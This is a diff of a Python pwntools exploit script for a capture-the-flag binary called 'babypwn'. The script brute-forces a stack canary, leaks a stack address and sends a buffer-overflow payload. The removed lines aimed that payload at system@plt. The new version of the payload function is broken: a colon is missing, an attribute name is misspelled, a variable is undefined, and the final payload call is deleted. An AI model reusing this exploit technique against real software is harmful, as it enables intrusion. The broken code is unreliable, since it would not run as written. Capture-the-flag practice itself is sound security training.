@@ -1,5 +1,6 @@
 from pwn import *
 from termcolor import colored
+import time
 """===============    Configuration    ================"""
 
 class Exploit():
@@ -7,7 +8,6 @@ class Exploit():
     sendMsgAdr = "0x08048907"
     exitCmp    = "0x08048b57"
     bytesToCanary = 40
-
     def __init__(self):
         self.pwnName = "babypwn"
         self.local = True
@@ -23,7 +23,8 @@ class Exploit():
 
     def connect(self):
         if self.local:
-            #self.vp = process(["./" + self.pwnName, " %s"%self.port])
+            self.vp = process(["./" + self.pwnName, " %s"%self.port])
+
             self.host = "localhost"
             self.r = remote(self.host, self.port)
 
@@ -38,7 +39,7 @@ class Exploit():
         if choice == 3:
             self.r.close()
             self.r = remote(self.host,self.port)
-            #print colored(self.vp.recv(), "red")
+            print colored(self.vp.recv(), "red")
 
 
     def getCanary(self):
@@ -63,25 +64,18 @@ class Exploit():
         payload += 'B' * 8
         self.r.sendline(payload)
         leak = self.r.recv()
-        stackLeak = u32( leak[ stackOff+4:stackOff+8 ])
-        self.buffAddr = stackLeak-0x174
-        log.info("stackAddr: {}".format(colored(hex(self.buffAddr), "green")))
+        self.stackLeak = u32( leak[ stackOff+4:stackOff+8 ])
+        log.info("stackAddr: {}".format(colored(hex(self.stackLeak), "green")))
 
-    def payload(self):
-        gdb.attach(self.r, execute="b *{}".format("system@plt"))
-        self.menu(1)
+    def payload(self)
         #canary is checked at point offset 15-19
-        self.r.recv()
-        filler = 'A'*self.bytesToCanary
-        payload = filler
-        payload += p32(self.canary)
-        payload += p32(self.binary.plt['system'])*5
-        payload += p32(self.buffAddr)
-        log.info("payload: {}".format(payload))
-        self.r.sendline(payload)
+        filler = 'a'*self.byteToCanary
+        payload =filler + self.canary
+
+        #data=fit({},filler='ABCDEFHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwyxz', length=100)
+        self.r.sendafter(': ', str(data))
         time.sleep(0.1)
-        self.r.recv()
-        self.menu(3)
+        self.r.recvline()
 
     def bruteForceCanary(self):
         #"Input Your Message : "
@@ -95,6 +89,9 @@ class Exploit():
 
     def checkStackCanary(self):
         self.menu(1)
+        gdb.attach(self.r, execute="b *{}".format(
+            exp.exitCmp)
+        )
         self.overflow()
         self.menu(3)
 
@@ -104,5 +101,5 @@ if __name__ == "__main__":
 
     exp.getCanary()
     exp.getStackLeak()
-    exp.payload()
+
 
